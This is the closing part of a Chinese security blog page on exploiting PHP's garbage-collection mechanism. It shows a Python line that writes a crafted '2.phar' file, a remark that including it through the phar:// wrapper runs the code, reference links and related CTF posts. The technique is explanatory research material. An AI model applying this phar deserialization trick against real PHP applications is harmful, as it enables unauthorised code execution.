+</span></span><span class="line"><span class="cl"><span class="nb">open</span><span class="p">(</span><span class="s2">&#34;2.phar&#34;</span><span class="p">,</span><span class="s2">&#34;wb&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">newf</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>接着使用<code>phar://</code> 伪协议包含2.phar这个文件即可,成功执行了</p>
+<p><img src="/p/php%E5%BA%95%E5%B1%82_gc_%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/image-20221120162937285.png"
+	width="1064"
+	height="633"
+	srcset="/p/php%E5%BA%95%E5%B1%82_gc_%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/image-20221120162937285_hu6969d44455ec07431eff7511fb2167c9_63804_480x0_resize_box_3.png 480w, /p/php%E5%BA%95%E5%B1%82_gc_%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/image-20221120162937285_hu6969d44455ec07431eff7511fb2167c9_63804_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="image-20221120162937285"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="168"
+		data-flex-basis="403px"
+	
+></p>
+<h2 id="参考链接">🔗参考链接</h2>
+<p><a class="link" href="https://yangxikun.com/php/2013/08/24/php-garbage-collection-mechanism.html"  target="_blank" rel="noopener"
+    >PHP新的垃圾回收机制 (yangxikun.com)</a></p>
+<p><a class="link" href="http://blog.m1kael.cn/index.php/archives/14/"  target="_blank" rel="noopener"
+    >PHP的GC机制 - M1kael‘s Blog</a></p>
+<p><a class="link" href="https://xz.aliyun.com/t/11843?accounttraceid=411ebc73f66f4f69aea04cef67b0ae0akryd"  target="_blank" rel="noopener"
+    >浅析PHP GC垃圾回收机制及常见利用方式 - 先知社区 (aliyun.com)</a></p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/php/">php</a>
+        
+    </section>
+
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under CC BY-NC-SA 4.0</span>
+    </section>
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">相关文章</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="has-image">
+    <a href="/p/sqlmap_tamper/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="/image46.png" loading="lazy" data-key="" data-hash="/image46.png"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Sqlmap_tamper</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/2022%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="/1.png" loading="lazy" data-key="" data-hash="/1.png"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">2022强网杯线上</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="/image1.png" loading="lazy" data-key="" data-hash="/image1.png"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">反序列化字符逃逸</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/swpuctf_2018_simplephp/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="/luck.png" loading="lazy" data-key="" data-hash="/luck.png"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">SWPUCTF_2018_SimplePHP</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/encrypt/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="/103365922_p0.png" loading="lazy" data-key="" data-hash="/103365922_p0.png"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">encrypt</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2021 - 
+        
+        2023 main1o&#39;s Blog
+    </section>
+    
+    <section class="powerby">
+        
+            <img src="https://icp.gov.moe/favicon.ico" alt width="15px" height="15px"><a href="https://icp.gov.moe/?keyword=20229978" target="_blank">萌ICP备20229978号</a> <br/>
+        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        主题 <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.16.0">Stack</a></b> 由 <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> 设计
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
